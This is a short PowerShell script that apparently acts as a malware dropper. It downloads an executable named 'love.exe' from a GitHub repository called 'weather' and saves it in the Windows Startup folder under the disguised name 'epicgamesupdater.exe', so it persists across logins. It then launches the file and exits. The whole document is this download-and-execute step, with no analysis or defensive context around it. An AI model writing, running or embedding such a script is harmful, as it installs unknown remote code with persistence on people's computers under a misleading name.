$url = "https://github.com/FCsab/weather/blob/main/love.exe?raw=true"
$dest = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\epicgamesupdater.exe"
Invoke-WebRequest -Uri $url -OutFile $dest -UseBasicParsing
Start-Process -FilePath $dest
exit
